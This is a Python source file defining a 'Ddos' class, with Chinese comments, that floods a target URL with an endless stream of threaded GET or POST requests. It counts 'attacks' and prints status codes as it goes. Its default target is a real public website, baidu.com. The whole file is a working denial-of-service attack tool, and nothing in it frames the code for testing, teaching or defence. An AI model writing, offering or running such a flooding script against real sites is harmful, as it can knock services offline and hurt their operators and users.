from requests.exceptions import ConnectionError, ConnectTimeout
from threading import Thread
from urllib3.exceptions import MaxRetryError, ConnectTimeoutError

import requests
import signal


class Ddos:

    def __init__(self, url='https://www.baidu.com', methodId=0, maxThread=100,
                 headers={}, getParam={}, postData={}, timeout=10):
        self.attackCount = 0  # 攻击次数计数
        self.runningThread = 0  # 正在运行的线程数
        self.status_code = 0  # 最新状态码

        self.setUrl(url)
        self.setMethod(methodId)
        self.setMaxThread(maxThread)

        self.setHeaders(headers)
        self.setGetParam(getParam)
        self.setPostData(postData)

        self.setTimeout(timeout)

    # ddos开始
    def start(self):
        # 监听ctrl+c中断信号
        signal.signal(signal.SIGINT, exit)
        signal.signal(signal.SIGTERM, exit)

        while True:
            if self.runningThread < self.maxThread:
                t = Thread(target=self.attack, name=str(self.attackCount))
                t.setDaemon(False)
                t.start()
                self.flush()

    # 一个攻击线程所使用的攻击方法
    def attack(self):
        self.runningThread += 1
        self.attackCount += 1
        try:
            if self.methodId == 0:
                res = requests.get(self.url, params=self.getParam,
                                   headers=self.headers, timeout=self.timeout)
            elif self.methodId == 1:
                res = requests.post(self.url, data=self.postData)
            # 更新状态值
            self.status_code = res.status_code
        except ConnectionError:
            print('[Error]: ConnectionError.')
        except ConnectTimeout:
            print('[Error]: ConnectTimeout.')
        except ConnectTimeoutError:
            print('[Error]: ConnectTimeoutError.')
        except MaxRetryError:
            print('[Error]: MaxRetryError.')
        else:
            pass
        finally:
            self.runningThread -= 1

    # 刷新当前攻击状态数据
    def flush(self):
        print('Threads: ', self.runningThread,
              ' StatusCode: ', self.status_code,
              ' AttackCount: ', self.attackCount)

    def setUrl(self, url):
        self.url = url

    def setMethod(self, methodId):
        # 0:get; 1:post
        self.methodId = methodId

    def setMaxThread(self, maxThread):
        self.maxThread = maxThread

    def setHeaders(self, headers):
        self.headers = headers

    def setGetParam(self, getParam):
        self.getParam = getParam

    def setPostData(self, postData):
        self.postData = postData

    def setTimeout(self, timeout):
        self.timeout = timeout
